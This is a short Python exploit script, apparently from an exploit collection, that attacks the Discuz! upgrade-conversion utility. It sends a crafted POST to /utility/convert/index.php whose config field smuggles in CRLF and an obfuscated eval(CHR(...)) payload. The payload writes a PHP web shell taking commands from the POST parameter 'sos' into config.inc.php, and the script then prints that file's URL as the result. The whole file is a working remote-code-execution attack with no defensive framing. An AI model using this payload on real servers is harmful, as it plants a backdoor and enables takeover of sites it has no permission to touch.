#!/usr/bin/python
# -*- coding:utf-8
import re,sys
sys.path.append('..')
from expFunc import *

url=sys.argv[1]
payload ="/utility/convert/index.php"
bug ="系列产品升级转换"
info = "/utility/convert/data/config.inc.php"

def main():
    res = HttpPost(url+payload,"a=config&source=d7.2_x2.0&submit=yes&newconfig%5Btarget%5D%5Bdbhost%5D=localhost&newconfig%5Baaa%0D%0A%0D%0Aeval%28CHR%28101%29.CHR%28118%29.CHR%2897%29.CHR%28108%29.CHR%2840%29.CHR%2834%29.CHR%2836%29.CHR%2895%29.CHR%2880%29.CHR%2879%29.CHR%2883%29.CHR%2884%29.CHR%2891%29.CHR%28115%29.CHR%28111%29.CHR%28115%29.CHR%2893%29.CHR%2859%29.CHR%2834%29.CHR%2841%29.CHR%2859%29%29%3B%2F%2F%5D=localhost&newconfig%5Bsource%5D%5Bdbuser%5D=root&newconfig%5Bsource%5D%5Bdbpw%5D=&newconfig%5Bsource%5D%5Bdbname%5D=discuz&newconfig%5Bsource%5D%5Btablepre%5D=cdb_&newconfig%5Bsource%5D%5Bdbcharset%5D=&newconfig%5Bsource%5D%5Bpconnect%5D=1&newconfig%5Btarget%5D%5Bdbhost%5D=localhost&newconfig%5Btarget%5D%5Bdbuser%5D=root&newconfig%5Btarget%5D%5Bdbpw%5D=&newconfig%5Btarget%5D%5Bdbname%5D=discuzx&newconfig%5Btarget%5D%5Btablepre%5D=pre_&newconfig%5Btarget%5D%5Bdbcharset%5D=&newconfig%5Btarget%5D%5Bpconnect%5D=1&submit=%B1%A3%B4%E6%B7%FE%CE%F1%C6%F7%C9%E8%D6%C3","User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
    if res[0].find(bug)!= -1:
        print(Result+url+info);


main()
